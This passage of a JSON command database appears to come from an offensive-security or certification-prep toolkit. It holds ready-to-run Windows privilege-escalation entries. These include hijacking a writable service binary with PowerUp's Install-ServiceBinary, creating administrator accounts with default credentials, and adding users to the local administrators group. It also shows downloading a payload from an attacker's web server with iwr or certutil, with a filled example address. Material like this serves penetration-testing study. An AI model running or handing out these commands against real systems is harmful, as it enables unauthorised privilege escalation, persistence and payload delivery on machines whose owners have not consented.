        "Install-ServiceBinary": "PowerUp function to replace service binary with payload",
        "-Name": "Service name to exploit"
      },
      "tags": [
        "AUTOMATED",
        "EXPLOITATION",
        "POST_EXPLOITATION",
        "POWERSHELL",
        "POWERUP",
        "PRIVILEGE_ESCALATION",
        "SERVICE_HIJACKING",
        "WINDOWS"
      ],
      "success_indicators": [
        "Service binary",
        "backed up",
        "User john created"
      ],
      "failure_indicators": [
        "not modifiable by the current user",
        "throw",
        "RuntimeException"
      ],
      "next_steps": [
        "win-shutdown-reboot",
        "win-localgroup-admins-check"
      ],
      "prerequisites": [
        "win-powerup-modifiable-service"
      ],
      "notes": "DEFAULT CREDENTIALS CREATED:\n  Username: john\n  Password: Password123!\n\nCustom user/password:\n  Install-ServiceBinary -Name '<SERVICE>' -UserName 'newuser' -Password 'P@ssw0rd!'\n\nCustom command:\n  Install-ServiceBinary -Name '<SERVICE>' -Command 'net localgroup administrators dave /add'\n\nKNOWN BUG WARNING:\nInstall-ServiceBinary fails when service PathName contains arguments with paths.\nExample that breaks PowerUp:\n  C:\\xampp\\mysql\\bin\\mysqld.exe --defaults-file=c:\\xampp\\mysql\\bin\\my.ini mysql\n\nWorkaround: Use manual exploitation (backup binary, transfer payload, replace, restart).\n\nStill requires service restart after running:\n- If CanRestart: True - try Invoke-ServiceAbuse\n- If CanRestart: False - need reboot\n\nTime estimate: 5 seconds + restart time",
      "educational": {
        "purpose": "Automated exploitation of writable service binary",
        "manual_alternative": "Manual binary replacement method",
        "common_failures": [
          "PathName with arguments causes failure (known bug)",
          "Cannot restart service (use reboot)"
        ],
        "when_to_use": [
          "When Get-ModifiableServiceFile finds vulnerable service",
          "Service path doesn't contain path-like arguments"
        ],
        "time_estimate": "5 seconds"
      },
      "troubleshooting": {
        "not modifiable by the current user": "Known PowerUp bug with complex paths - use manual method",
        "Cannot restart service": "Use reboot if SeShutdownPrivilege available"
      },
      "filled_example": "Install-ServiceBinary -Name 'mysql'"
    },
    {
      "id": "win-transfer-iwr",
      "name": "Transfer Payload to Target (PowerShell)",
      "category": "post-exploit",
      "subcategory": "service-binary-hijacking",
      "command": "iwr -uri http://<LHOST>/<FILENAME> -Outfile <DESTINATION>",
      "description": "Download payload from attacker's web server using PowerShell Invoke-WebRequest.",
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker's IP address hosting web server",
          "example": "192.168.45.5",
          "required": true
        },
        {
          "name": "<FILENAME>",
          "description": "Name of file to download",
          "example": "adduser.exe",
          "required": true
        },
        {
          "name": "<DESTINATION>",
          "description": "Local path to save file",
          "example": "C:\\Users\\dave\\adduser.exe",
          "required": true
        }
      ],
      "flag_explanations": {
        "iwr": "Alias for Invoke-WebRequest",
        "-uri": "URL to download from",
        "-Outfile": "Local path to save downloaded file"
      },
      "tags": [
        "FILE_TRANSFER",
        "POST_EXPLOITATION",
        "POWERSHELL",
        "SERVICE_HIJACKING",
        "WINDOWS"
      ],
      "success_indicators": [
        "No output (success)",
        "File created at destination"
      ],
      "failure_indicators": [
        "Unable to connect",
        "404",
        "Access denied"
      ],
      "next_steps": [
        "win-service-binary-replace"
      ],
      "prerequisites": [
        "win-cross-compile-adduser"
      ],
      "notes": "Start web server on Kali FIRST:\n  python3 -m http.server 80\n  OR\n  sudo systemctl start apache2 (files in /var/www/html/)\n\nCertutil alternative:\n  certutil -urlcache -f http://<LHOST>/<FILE> <DEST>\n\nVerify download:\n  dir <DESTINATION>\n\nTime estimate: 2-5 seconds (depending on network)",
      "educational": {
        "purpose": "Transfer exploit payload from attacker to target",
        "manual_alternative": "certutil -urlcache -f http://<URL> <DEST>",
        "common_failures": [
          "Web server not running",
          "Firewall blocking connection",
          "File permissions on destination"
        ],
        "time_estimate": "2-5 seconds"
      },
      "filled_example": "iwr -uri http://192.168.45.5/adduser.exe -Outfile C:\\Users\\dave\\adduser.exe"
    }
  ]
}